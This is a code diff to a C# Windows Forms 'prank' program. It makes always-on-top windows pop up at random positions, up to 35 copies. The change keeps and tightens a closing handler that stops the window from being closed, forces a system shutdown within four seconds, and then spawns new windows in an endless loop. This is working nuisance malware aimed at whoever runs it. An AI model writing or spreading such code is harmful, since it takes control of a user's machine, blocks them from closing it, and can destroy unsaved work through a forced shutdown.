@@ -2,19 +2,29 @@ using System.Diagnostics;
 
 namespace popping_up_prank
 {
+
+    static class Windows
+    {
+        public static int windows;
+    }
+
+
     public partial class Form1 : Form
     {
-        private int windows = 0;
-
         public Form1()
         {
             InitializeComponent();
-            this.pictureBox.TabIndex = 2137;
+            this.SuspendLayout();
+            this.pictureBox.TabIndex = 0;
             this.pictureBox.TabStop = false;
+            ((ISupportInitialize)this.pictureBox).EndInit();
+            this.TopMost = true;
+            this.ResumeLayout(false);
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
+            this.RandomizePosition();
             new Thread(new ThreadStart(this.Thread)).Start();
         }
         private void Thread()
@@ -22,7 +32,7 @@ namespace popping_up_prank
             while (true)
             {
                 System.Threading.Thread.Sleep(1000);
-                this.Invoke((Delegate)(() => this.RandomizePosition()));
+                _ = this.Invoke((Delegate)(() => this.RandomizePosition()));
             }
         }
         private void RandomizePosition()
@@ -32,18 +42,18 @@ namespace popping_up_prank
             if (random.Next(0, 10) >= 5)
                 return;
 
-            if (this.windows >= 35)
+            if (Windows.windows >= 35)
             {
                 return;
             }
             new Form1().Show();
-            this.windows += 1;
+            Windows.windows += 1;
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             e.Cancel = true;
-            Process.Start("shutdown", "/s /t 5");
+            Process.Start("shutdown", "/s /t 4");
             while (true)
                 new Form1().Show();
         }
